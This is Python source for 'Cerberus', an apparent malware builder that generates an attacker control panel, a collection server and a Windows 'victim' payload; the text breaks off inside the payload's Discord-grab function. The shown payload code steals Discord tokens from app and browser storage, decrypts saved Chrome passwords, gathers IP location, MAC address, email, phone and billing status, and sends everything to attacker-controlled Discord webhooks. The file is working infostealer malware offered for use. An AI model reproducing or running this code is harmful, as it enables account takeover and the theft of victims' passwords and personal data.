# -*- coding: utf-8 -*-

# IMPORTS

from pyfade import Fade, Colors
from pycenter import center
from requests import get

from os import name, system, mkdir, rmdir
from os.path import isdir
from json import dump
from base64 import b64decode as bd
from random import randint, choice

from threading import Thread


encoding = "utf-8"

def clear():
    system("cls" if name == 'nt' else "clear")


def url_check(webhook:str) -> bool:
    try:
        return get(webhook).status_code == 200
    except:
        return False

def port_check(port:str) -> bool:
    try:
        port = int(port)
    except ValueError:
        return False
    return 1000 < port < 10000






if name == 'nt':
    system("title Cerberus")
    system("mode 160, 40")


clear()


class Col:
    colors = {"red" : "\033[38;2;255;0;0m", 
              "orange" : "\033[38;2;255;100;0m", 
              "yellow" : "\033[38;2;255;255;0m",
              "white" : "\033[38;2;255;255;255m"}

    red = colors['red']

    orange = colors['orange']

    yellow = colors['yellow']
    
    white = colors['white']


cerberus_text = f"""
 
 ▄████████    ▄████████    ▄████████ ▀█████████▄     ▄████████    ▄████████ ███    █▄     ▄████████ 
███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
███    █▀    ███    █▀    ███    ███   ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
███         ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███   ███        
███        ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ 
███    █▄    ███    █▄  ▀███████████   ███    ██▄   ███    █▄  ▀███████████ ███    ███          ███ 
███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███    ▄█    ███ 
████████▀    ██████████   ███    ███ ▄█████████▀    ██████████   ███    ███ ████████▀   ▄████████▀  
                          ███    ███                             ███    ███                             
                                                                                {Fade.Horizontal(Colors.red_to_yellow, "*BUILDER")}"""

author = "• • • {} • • •".format(bd("YmlsbHl0aGVnb2F0MzU2").decode('utf-8'))

print(Fade.Vertical(Colors.yellow_to_red, center(cerberus_text)))
print(Fade.Horizontal(Colors.red_to_yellow, center(author)))
print('\n')


tokens_webhook = input(Col.yellow + "Enter the webhook for token logs > " + Col.white)

if not url_check(tokens_webhook):
    print()
    input(Col.red + "Invalid webhook."+Col.white)
    exit()

passwords_webhook = input(Col.yellow + "Enter the webhook for passwords logs > " + Col.white)

if not url_check(passwords_webhook):
    print()
    input(Col.red + "Invalid webhook."+Col.white)
    exit()

webhooks = {"tokens":tokens_webhook,"passwords":passwords_webhook}

print()

while True:
    hacker_key, victim_key = "".join(str(randint(0,10)) for _ in range(10)), "".join(str(randint(0,10)) for _ in range(10))
    if hacker_key != victim_key:
        break

port = input(Col.orange + "Enter the port > [1000-10000] ")



if not port_check(port):
    print()
    input(Col.red + "Invalid port!"+Col.white)
    exit()


print()

def build():
    if isdir("HACKER"):
        input(Col.red+"Error. Directory 'HACKER' already exists."+Col.white)
        exit()
    if isdir("VICTIM"):
        input(Col.red+"Error. Directory 'HACKER' already exists."+Col.white)
        exit()
    mkdir("HACKER")
    mkdir("VICTIM")
    mkdir("HACKER/SERVER")
    mkdir("HACKER/SERVER/src")
    mkdir("HACKER/SERVER/db")
    with open("HACKER/hacker.py", 'w', encoding=encoding) as f:
        f.write(HACKER.hacker)
    with open("HACKER/SERVER/server.py", 'w', encoding=encoding) as f:
        f.write(HACKER.SERVER.server)
    with open("HACKER/SERVER/src/client.py", 'w', encoding=encoding) as f:
        f.write(HACKER.SERVER.src.client)
    with open("HACKER/SERVER/src/db.py", 'w', encoding=encoding) as f:
        f.write(HACKER.SERVER.src.db)
    with open("HACKER/SERVER/src/handler.py", 'w', encoding=encoding) as f:
        f.write(HACKER.SERVER.src.handler)
    with open("HACKER/SERVER/src/webhooks.py", 'w', encoding=encoding) as f:
        f.write(HACKER.SERVER.src.webhooks)
    with open("HACKER/SERVER/webhooks.json", 'w', encoding=encoding) as f:
        dump(webhooks, f, indent=2)
    for dir in ["tokens", "passwords", "websites"]:
        if not isdir("HACKER/SERVER/db/"+dir):
            mkdir("HACKER/SERVER/db/"+dir)
    with open("HACKER/SERVER/db/tokens/tokens.txt", 'w'):
        pass

    with open("VICTIM/victim.py", 'w', encoding=encoding) as f:
        f.write(VICTIM.victim)



class HACKER:
    hacker = r'''# -*- coding: utf-8 -*-

# REQUIREMENTS

from terminaltables import DoubleTable
from pyfade import Fade, Colors
from pycenter import center


# IMPORTS

import socket
from os import system, name
from time import sleep
from json import dumps, loads, JSONDecodeError
from base64 import b64decode as bd
from webbrowser import open_new_tab



# FUNCTIONS

def clear():
    system("cls" if name == 'nt' else "clear")

if name == 'nt':
    system("title Cerberus")
    system("mode 200, 40")


def create_table(dictionnary:dict, title:str):
    table = [(f" {str(key)}" if len(str(key)) == 1 else str(key), value) for key, value in dictionnary.items()]
    return DoubleTable(table_data=table, title=title)


# VARIABLES

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '127.0.0.1', ''' + port + r'''
encoding = 'utf-8'
data_len = 65536

hacker_key = "''' + hacker_key + r'''"

codes = {
        0: "Modes",
        1: 'Webhooks',
        2: 'Tokens',
        3: "Websites",
        4: "Passwords",
        5: "Credits"
        }

table_instance = create_table(codes, "Menu")


# CLEAR TERMINAL

clear()


# CLASSES

class Client:

    def __init__(self, start:bool=False) -> None:


        self.socket = socket
        
        if start:
            self.connect()

    
    def connect(self):
        while True:
            try:
                self.socket.connect(host)
                sleep(1.5)
                break
            except ConnectionRefusedError:
                pass

        self.send(hacker_key)


    def send(self, data) -> None:
        if type(data) != str:
            data = dumps(data)
        try:
            self.socket.send(data.encode(encoding))
        except (InterruptedError, OSError):
            return self.disconnect()


    def recv(self):
        try:
            data = self.socket.recv(data_len).decode(encoding)
        except (InterruptedError, OSError):
            return self.disconnect()
        try:
            data = int(data)
        except ValueError:
            pass
        try:
            data = loads(data)
        except (JSONDecodeError, TypeError):
            pass
        if not data:
            return self.disconnect()
        return data

    def disconnect(self):
        try:
            self.socket.close()
            exit()
        except:
            pass



class Modes(Client):

    # 1
    def webhooks(self):
        self.send("webhooks")
        return self.recv()

    # 2
    def tokens(self):
        self.send("tokens")
        return self.recv()

    # 3
    def websites(self, website=None):
        if website:
            self.send({"websites":website})
        else:
            self.send("websites")
        return self.recv()
    
    # 4
    def passwords(self, user_ip=None):
        if user_ip:
            self.send({"passwords":user_ip})
        else:
            self.send("passwords")
        return self.recv()

    

class Cerber():

    cerberus_logo = """
                                               /-                                                   
                                            `+d:                                                    
                                           :dN/                                                     
                                          +mNd                                                      
                                        `:mNNd`                                                     
                                       .ddNNNNd+.                                                   
                                       yNNNNNNNNmo`   ```                      `                    
                                      `mNNNNNNNNNNd+ddmmddyo:-`          `.:ohddd+                  
                                      oNNNNNNNNNNNNmNNhmNNNNmmddhhyyyyhhddmmNNNNN+                  
              :syso/-                 hNNNNNNNNNNNNNNN+.-/hNNNNNNNNNNNNNNNNNNNNNNs   `.-`....`      
               `/dNNmdy+`             yNNNNNNNNNNNNNNNmhydmNNNNNNNNNNNNNNNNNNNNNms`/yddmddds:`      
                 .mNNNNmy:`           /NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdyso+/+hNNNNNd+.         
                  yNNNNNNmh-`        .yNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmyo+syhdmmNNNNNNd.           
                  sNNNNNNNNdhhs.    /dNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNh+:+sssooo+yNNNNNNs            
                  /mNNNNNNNNNNNd:  +mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmh/--/osyhdmd:+NNNNNN/            
                :h+odNNNNNNNNNNm: .ymNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmhhdmNNNNNms-/mNNNmdo::           
               +mNNmmNNNNNNNNNNy  +mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdyy/-:ymNNNNmddmm.          
              omNmsmNNNNNNNNNNN: :mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmddhs/..:ohmNNNNNNdhNNNy          
             +mNm/`dNNNNNNNNNNN` /hNNNNNNNNNNNNNNNNNNNNNNNNmhs+o+/:---/ohdmNNNNNNNNN:-mNNm`         
           `omNNmyhNNNNNNNNNNNm  +NNNNNNNNNNNNNNNNNNNNNNmhs-`.:+syhdmNNNNNNNNNNNNNNNdymNNN:         
       ``-+dNNNNNNNNNNNNNNNNNNN` mmNNNNNNNNNNNNNNNNNNNNmo` -sdNNNNNNNNNNNNNNNNNNNNNNNNNNNNd:        
  `.:+shdmNNNNNNNNNNNNNNNNNNNNN/`+yNNNNNNNNNNNNNNNNNNNNh` -mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.      
.+ymNNNNNNNNNNNNNNNNNNNNNNNNNNNh `mNNNNNNNNNNNNNNNNNNNNm. oNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNd+`    
+dNNNNNNNmmhomNNNNNNNNNNNNNNNNNN+/NNNNNNNNNNNNNNNNNNNNNN+ :NNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNdo.  
 .hmNmmds/..yNNNNNNNmmmshdmNNNNNmyNNNNNNNNNNNNNNNNNNNNNNm/`yNNNNNNNNNmdhdNNNNNNNNNNNNNm-/dNNNNNNNms-
  `/+yo``-odNNNNNmdo/--` `:odyhmNNNNNNNNNNNNNNNNNNNNNNNNNmo-dNNNmdmh/-` -/+shmNNNNNNNNs  `omNNNNNmds
     .+hmNNNNmmho- .+syyso/``` +mNNNNNNNNNNNNNNNNNNNNNNNNNNmdNNh-`:   ``.--.`-+dmmNNNNy    /hyhdh/` 
      :yhyso/-`    `/hmNNNNms.  /mNNNNNNNNNNNNNNNNNNNNNNNNNNmNh`   .+ydNNNNNmho`./ymNNN+`   -       
                      -smmNNNm:  osNNNNNNNNNNNNNNNNNNNNNNNNN+h.  `omNNNNNNmms:     .ommNd:          
                        `:smmNm-  .NNNNNNNNNNNNNNNNNNNNNNNNN.   `hNNNNNmms/`         `/sy.          
                            -+yh  +NNNNNNNNNNNNNNNNNNNNNNNNN.  `hNNmmho-`                           
                                  ohmmmNNNNNNNNNNNNNNNNNNNNNo  +hs/-`                               
                                     .-/+syhddmmmNNmmmddhyso/                                                                  
                                                          
"""

    cerberus_text = """
 
 ▄████████    ▄████████    ▄████████ ▀█████████▄     ▄████████    ▄████████ ███    █▄     ▄████████ 
███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
███    █▀    ███    █▀    ███    ███   ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
███         ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀ ███    ███   ███        
███        ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ 
███    █▄    ███    █▄  ▀███████████   ███    ██▄   ███    █▄  ▀███████████ ███    ███          ███ 
███    ███   ███    ███   ███    ███   ███    ███   ███    ███   ███    ███ ███    ███    ▄█    ███ 
████████▀    ██████████   ███    ███ ▄█████████▀    ██████████   ███    ███ ████████▀   ▄████████▀  
                          ███    ███                             ███    ███                             
"""

    author = "• • • {} • • •".format(bd("YmlsbHl0aGVnb2F0MzU2").decode(encoding))


    def cerber_logo_print():
        print(Fade.Vertical(Colors.yellow_to_red, center(Cerber.cerberus_logo)))


    def cerber_text_print():
        print(Fade.Vertical(Colors.yellow_to_red, center(Cerber.cerberus_text)))
        print(Fade.Horizontal(Colors.yellow_to_red, center(Cerber.author)))
        print('\n')


class Menu:
      

    def menu(table=table_instance, page=0, sup=None):
        clear()
        Cerber.cerber_text_print()
        print(Fade.Vertical(Colors.yellow_to_red, center(table.table)))

        if page == 0:
            mode = input("> ")

            if mode == "1":
                webhooks = Modes().webhooks()
                table = create_table(webhooks, "Webhooks")
                return Menu.menu(table, page=1)

            elif mode == "2":
                tokens = Modes().tokens().splitlines()
                length = range(1, len(tokens) + 1)
                tk = {0: "..."}
                for l, t in zip(length, tokens):
                    tk[l] = t
                table = create_table(tk, "Tokens")
                return Menu.menu(table, page=1)

            elif mode == '3':
                websites = Modes().websites()
                length = range(1, len(websites) + 1)
                wb = {0: "..."}
                for l, t in zip(length, websites):
                    wb[l] = t
                table = create_table(wb, "Websites")
                return Menu.menu(table, page=2, sup=websites)

            elif mode == "4":
                passwords = Modes().passwords()
                length = range(1, len(passwords) + 1)
                psw = {0: "..."}
                for l, t in zip(length, passwords):
                    psw[l] = t
                table = create_table(psw, "Passwords")
                return Menu.menu(table, page=3, sup=passwords)
            
            elif mode == "5":
                open_new_tab("https://github.com/billythegoat356/Cerberus")
                return Menu.menu()

            else:
                return Menu.menu()


        elif page == 1:
            input("> ")
            return Menu.menu()

        elif page == 2:
            mode = input("> ")
            try:
                mode = int(mode) -1
            except (TypeError, ValueError):
                return Menu.menu()
            if mode not in range(len(sup)):
                return Menu.menu()
            wb = Modes().websites(sup[mode])
            length = range(1, len(wb) + 1)
            tk = {0: sup[mode].split("[")[0].strip()}
            for l, t in zip(length, wb):
                tk[l] = t
            table = create_table(tk, "Websites")
            return Menu.menu(table)
        
        elif page == 3:
            mode = input("> ")
            try:
                mode = int(mode) -1
            except (TypeError, ValueError):
                return Menu.menu()
            if mode not in range(len(sup)):
                return Menu.menu()
            wb = Modes().passwords(sup[mode].split("_")[0])
            length = range(1, len(wb) + 1)
            tk = {0: sup[mode].split("[")[0].strip()}
            for l, t in zip(length, wb):
                tk[l] = t
            table = create_table(tk, "Websites")
            return Menu.menu(table)



        return Menu.menu()



# EXECUTE

if __name__ == '__main__':
    Cerber.cerber_logo_print()
    client = Client(True)
    Menu.menu()
    
    socket.close()



'''
    class SERVER:
        server = r'''# -*- coding: utf-8 -*-

# IMPORTS

import socket
from json import dumps, loads

from src.client import Client

from threading import Thread


# HOST AND PORT

host = '', ''' + port + r'''




socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket.bind(host)


# LISTEN FOR NEW CONNECTIONS

def listen():
    while True:
        socket.listen()
        conn, addr = socket.accept()
        Client(conn, addr)

listen()



socket.close() 
'''

        class src:
            client = r'''# -*- coding: utf-8 -*-

# IMPORTS

from src.handler import Handler
from src.db import makedb

from json import dumps, loads, JSONDecodeError
from threading import Thread


# CREATE THE DATABASE

makedb()


# VARIABLES

victim_key = "''' + victim_key + r'''"
hacker_key = "''' + hacker_key + r'''"

encoding = 'utf-8'
data_len = 65536









# CLASS

class Client:
    def __init__(self, socket:object, address:str):

        self.socket = socket
        self.address = address

        Thread(target=self.connect).start()

    def connect(self):
        recv = str(self.recv())

        if recv == victim_key:
            self.admin = False
        elif recv == hacker_key:
            self.admin = True 
        else:
            self.disconnect()

        
        
        return self.start()


    def start(self):
        if self.admin:
            while True:
                data = self.recv()
                Handler.admin(data, self)
                
        else:
            while True:
                data = self.recv()
                Handler.victim(data)





    def send(self, data) -> None:
        if type(data) != str:
            data = dumps(data)
        try:
            self.socket.send(data.encode(encoding))
        except (InterruptedError, OSError):
            return self.disconnect()


    def recv(self):
        try:
            data = self.socket.recv(data_len).decode(encoding)
        except (InterruptedError, OSError):
            return self.disconnect()
        try:
            data = loads(data)
        except JSONDecodeError:
            pass
        if not data:
            return self.disconnect()
        return data
    
    def disconnect(self):
        try:
            self.socket.close()
            while True:
                pass
        except:
            pass
'''
            db = r'''# -*- coding: utf-8 -*-
            
# IMPORTS

from os.path import isdir, isfile
from os import mkdir, listdir


# ENCODING

encoding = "utf-8"


# FUNCTION

def makedb():
    if not isdir("db"):
        mkdir("db")
    for dir in ["tokens", "passwords", "websites"]:
        if not isdir("db/"+dir):
            mkdir("db/"+dir)
    if not isfile("db/tokens/tokens.txt"):
        with open("db/tokens/tokens.txt", 'w'):
            pass


# CLASSES

class Get:
    def get_websites():
        return Get.get_path('db/websites/')

    def get_website_passwords(website):
        website = "db/websites/"+website.split("[")[0].strip() + ".txt"
        return Get.get_path_passwords(website)

    def get_passwords():
        return Get.get_path("db/passwords/")


    def get_user_passwords(user_ip):
        path = "db/passwords/" + user_ip + "_passwords.txt"
        if not isfile(path):
            return
        return Get.get_path_passwords(path)

    
    def get_path(path:str):
        wbs = []
        for w in listdir(path):
            wb = w.split('.txt')[0]
            with open(path + w, 'r', encoding=encoding) as f:
                ww = f.read().splitlines()
            wt = sum('password' in l for l in ww)
            wb += ' [{}]'.format(wt)
            wbs.append(wb)
        return wbs
    
    def get_path_passwords(path):
        with open(path, 'r', encoding=encoding) as f:
            lines = f.read().splitlines()
        allw = []
        search = ''
        for line in lines:
            if (
                'host' in line
                and 'host' not in search
                or 'ip' in line
                and 'ip' not in search
                or 'email' in line
                and 'email' not in search
            ):
                search += line + ' | '
            elif 'password' in line and 'password' not in search:
                search += line
                allw.append(search)
                search = ''
        return allw


class Stock:

    def tokens(data) -> bool:
        with open("db/tokens/tokens.txt", 'r', encoding=encoding) as f:
            read = f.read()
        with open("db/tokens/tokens.txt", 'a', encoding=encoding) as f:
            if data not in read:
                f.write(data + '\n')

    def passwords(data:str, ip:str) -> bool:
        filename = f"db/passwords/{ip}_passwords.txt"
        passdata = ""
        for element in data:
            for k, v in element.items():
                passdata += "{}: {}\n".format(k, v)
            passdata += "\n"
        with open(filename, 'w', encoding=encoding) as f:
            f.write(passdata)
        return filename
    
    def websites(data:list, ip:str):
        for element in data:
            host = email = password = None
            for k, v in element.items():
                if k == "host":
                    realhost = v
                    host = v.split("://")[1].replace("/","")
                elif k == "email":
                    email = v
                elif k == "password":
                    password = v
            if host is None or email is None or password is None:
                continue
            if not isfile("db/websites/"+host+".txt"):
                with open("db/websites/"+host+".txt", 'w', encoding=encoding):
                    pass
            with open("db/websites/"+host+".txt", 'r', encoding=encoding) as f:
                read = f.read()
            with open("db/websites/"+host+".txt", 'a', encoding=encoding) as f:
                data = "host: {}\nip: {}\nemail: {}\npassword: {}\n\n".format(realhost, ip, email, password)
                if data not in read:
                    f.write(data)
'''
            handler = r'''# -*- coding: utf-8 -*-

# IMPORTS

from src.db import Stock, Get
from src.webhooks import Webhooks, get_webhooks


# ENCODING
encoding = "utf-8"


# CLASS

class Handler:
    def victim(data):

        if "token" in data:
            if (type(data) == dict
                and type(data["token"]) == list 
                and len(data["token"]) == 2 
                and "Token" in data["token"][1]):
                
                Webhooks.discord_token_grab(data["token"][0])

                Stock.tokens(data["token"][1])



        elif "passwords" in data:
            data, ip = data["passwords"][0], data["passwords"][1]
            
            
            filename = Stock.passwords(data, ip)
            Webhooks.chrome_passwords_grab(filename)
            Stock.websites(data, ip)
                



    
    def admin(data, user):
        if data == "webhooks":
            user.send(get_webhooks())
        
        elif data == "tokens":
            tokens = open("db/tokens/tokens.txt", 'r', encoding=encoding).read()
            if tokens:
                user.send(tokens)
            else:
                user.send("none")
        
        elif data == "websites":
            websites = Get.get_websites()
            if websites:
                user.send(websites)
            else:
                user.send(["none"])

        elif data == "passwords":
            passwords = Get.get_passwords()
            if passwords:
                user.send(passwords)
            else:
                user.send(["none"])

        elif type(data) == dict:
            if "websites" in data:
                website_passwords = Get.get_website_passwords(data["websites"])
                if website_passwords:
                    user.send(website_passwords)
                else:
                    user.send(["none"])
            elif "passwords" in data:
                user_passwords = Get.get_user_passwords(data["passwords"])
                if user_passwords:
                    user.send(user_passwords)
                else:
                    user.send(["none"])
'''

            webhooks = r'''# -*- coding: utf-8 -*-

# IMPORTS

from json import dump, load, dumps
from requests import post



# FUNCTIONS

def get_webhooks(mode:str=None):
    with open("webhooks.json", 'r') as f:
        webhooks = load(f)
    if mode:
        return webhooks[mode]
    else:
        return webhooks



# CLASS

class Webhooks:
    
    def make_data(content:list=None, embeds:list=None):

        data = {
            "username": "Cerberus",
            "avatar_url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
            }

        if content: data["content"] = content
        if embeds: data["embeds"] = [embeds]

        return data

    def discord_token_grab(embed):
        print(post(get_webhooks("tokens"), json=Webhooks.make_data(embeds=embed)))

    def chrome_passwords_grab(passfile):
        filedata = {"upload_file":open(passfile)}
        print(post(get_webhooks("passwords"), files=filedata, data=Webhooks.make_data()))        
'''


class VICTIM:
    victim = r'''# -*- coding: utf-8 -*-

from subprocess import check_output, CalledProcessError
from os import name


# QUICK CHECK IF THE VICTIM IS ON WINDOWS

if name != 'nt':
    exit()



# REQUIREMENTS

try:
    from requests import get, post
except ImportError:
    try:
        check_output("python -m pip install requests", shell=True)
        from requests import get, post
    except (CalledProcessError, ImportError):
        exit()

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    from cryptography.hazmat.primitives.ciphers.modes import GCM
    from cryptography.hazmat.backends import default_backend
except ImportError:
    try:
        check_output("python -m pip install cryptography", shell=True)
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
        from cryptography.hazmat.primitives.ciphers.modes import GCM
        from cryptography.hazmat.backends import default_backend
    except (CalledProcessError, ImportError):
        exit()



# IMPORTS

import socket as sock
from json import dumps, loads, JSONDecodeError

from os import getenv, listdir, remove
from os.path import isfile, isdir, join

from re import findall
from shutil import copy, copy2

from threading import Thread
from webbrowser import open as open_url

from time import sleep
from datetime import datetime
from uuid import getnode as get_mac

from base64 import b64decode
from sqlite3 import connect

from ctypes import Structure, wintypes, c_char, create_string_buffer, sizeof, byref, WinError, string_at, POINTER, windll





# VARIABLES

APP_DATA_PATH = getenv('localappdata')
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

host = '127.0.0.1', ''' + port + r'''
encoding = 'utf-8'
data_len = 8192

victim_key = "''' + victim_key + r'''"

socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)




# CLASSES

class Client:
    def __init__(self, socket:object) -> None:

        self.socket = socket

        self.connect()
    
    def connect(self):
        while True:
            try:
                self.socket.connect(host)
                break
            except ConnectionRefusedError:
                pass
        self.send(victim_key)

    
    def send(self, data) -> None:
        if type(data) != str:
            data = dumps(data)
        try:
            self.socket.send(data.encode(encoding))
        except (InterruptedError, OSError):
            return self.disconnect(reconnect=True)




    def recv(self):
        try:
            data = self.socket.recv(data_len).decode(encoding)
        except (InterruptedError, OSError):
            return self.disconnect(reconnect=True)
        if not data:
            return self.disconnect(reconnect=True)
        return data

    def disconnect(self, reconnect:bool=False):
        try:
            self.socket.close()
        except:
            pass
        if reconnect:
            self.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
            Client(self.socket)
        else:
            exit()

class Discord:

    def setheaders(token:str) -> dict:
        return {"Authorization" : token}


    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord"           : ROAMING + "\\Discord",
            "Discord Canary"    : ROAMING + "\\discordcanary",
            "Discord PTB"       : ROAMING + "\\discordptb",
            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def search(path:str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                if (
                                    get(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token),
                                    ).status_code == 200
                                    and token not in found_tokens
                                    and token not in tokens
                                ):
                                    found_tokens.append(token)

            return found_tokens

        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens

class Decrypt:

    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)


    def rcipher(key):
        return Cipher(algorithms.AES(key), None, backend=default_backend())
    
    def localdata():
        jsn = None
        with open(join(getenv('localappdata'), r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = loads(str(f.readline()))
        
        try:
            return jsn["os_crypt"]["encrypted_key"]
        except:
            return jsn
            
    def dpapi(encrypted):
        class DATA_BLOB(Structure):
            _fields_ = [('cbData', wintypes.DWORD),
                        ('pbData', POINTER(c_char))]

        p = create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(sizeof(p), p)
        blobout = DATA_BLOB()
        retval = windll.crypt32.CryptUnprotectData(
            byref(blobin), None, None, None, None, 0, byref(blobout))
        if not retval:
            raise WinError()
        result = string_at(blobout.pbData, blobout.cbData)
        windll.kernel32.LocalFree(blobout.pbData)
        return result
    
    def decryptions(encrypted_txt):
        encoded_key = Decrypt.localdata()
        encrypted_key = b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = Decrypt.dpapi(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = Decrypt.rcipher(key)
        return Decrypt.decrypt(cipher, encrypted_txt[15:], nonce)

class ChromePasswords:
    def __init__(self):
        self.passwordList = []


    def chromedb(self):
        try:
            _full_path = join(APP_DATA_PATH, DB_PATH)
            _temp_path = join(APP_DATA_PATH, 'sqlite_file')
            if isdir(_temp_path):
                remove(_temp_path)
            copy(_full_path, _temp_path)
            self.pwsd(_temp_path)
        except:
            pass

    def pwsd(self, db_file):
        conn = connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = {"host": host, 'email': name, 'password': value}
            self.passwordList.append(_info)
        conn.close()
        remove(db_file)


    def cdecrypt(self, encrypted_txt):
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = Decrypt.dpapi(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10':
                decrypted_txt = Decrypt.decryptions(encrypted_txt)
                return decrypted_txt[:-16].decode()
        except WindowsError:
            return None

class Grab:

    def get_ip() -> tuple:
            ip = org = loc = city = country = region = googlemap = "None"
            try:
                url = 'http://ipinfo.io/json'
                data = get(url).json()
                ip = data['ip']
                org = data['org']
                loc = data['loc']
                city = data['city']
                country = data['country']
                region = data['region']
                googlemap = "https://www.google.com/maps/search/google+map++" + loc
            except:
                pass
            return ip,org,loc,city,country,region,googlemap

    def discord_token_grab(token:str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            if get(url).status_code != 200:
                url += ".gif"
            return url
        def has_payment_methods(token) -> bool:
            has = False
            try:
                has =  bool(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=Discord.setheaders(token)).json())
            except:
                pass
            return has

        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"

        def verify(var):
            return valid if var else invalid

        user_data = get("https://discordapp.com/api/v6/users/@me", headers=Discord.setheaders(token)).json()
        ip,org,loc,city,country,region,googlemap = Grab.get_ip()
        computer_username = getenv("username")
        computer_name = getenv("computername")
        mac_address = get_mac()
        username = user_data["username"] + "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = getavatar(user_id, avatar_id)
        email = user_data.get("email")
        phone = user_data.get("phone")
        locale = user_data['locale']
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))
        boost = bool(user_data.get("purchased_flags"))

        nitro = "<:nitro:857384966861094962>" if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)
        
        if not phone: phone = invalid

        
        data = [{   
                    "title": "Cerberus",
                    "description": "https://github.com/billythegoat356/Cerberus",
                    "url": "https://github.com/billythegoat356/Cerberus",
                    "image": {
                        "url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
                    },
                    "color": 0xd15943,
                    "fields": [
                        {
                            "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTel enregistré: {phone}\nCarte Bancaire: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**Infos du PC**",
                            "value": f'Nom de l'utilisateur: {computer_username}\nNom de la machine: {computer_name}\nAdresse MAC: {mac_address}',
                            "inline": True
                        },
                        {
                            "name" : "**Nitro**",
                            "value": f'{nitro}',
                            "inline": True
                        },
                        {
                            "name": "**Géolocalisation**",
                            "value":f'IP: {ip} \nGéolocalisation: [{loc}]({googlemap}) \nVille: {city} \nRégion: {region}',
                            "inline": True
                        },
                        {
                            "name" : "**Infos Supplémentaires**",
                            "value": f'Localisation: {locale}\nEmail Vérifié: {email_verified}\n2FA Activée: {mfa_enabled}\nCreation Date: {creation_date}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },

                    "thumbnail": {
                        "url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
                    },

                    "footer": {
                        "text": f"billythegoat356"
                    }
                }]
        
